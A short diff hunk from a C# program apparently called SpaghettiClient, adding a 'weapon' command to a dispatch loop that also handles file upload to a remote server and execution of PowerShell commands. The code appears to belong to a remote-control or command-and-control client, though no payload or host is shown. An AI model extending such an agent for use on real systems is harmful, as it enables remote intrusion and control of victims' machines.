@@ -42,6 +42,10 @@ namespace SpaghettiClient
                     string filename = cmd.Substring(9).Replace("\"","");
                     Utilities.Put(fs_url, url, filename, location, sessionid);
                 }
+                else if (cmd.ToLower().StartsWith("weapon "))
+                {
+                    Utilities.ChooseWeapon(url, cmd);
+                }
                 else if (cmd.ToLower().StartsWith("powershell "))
                 {
                     (string output, string error) = commands.RunPSH(cmd, location);
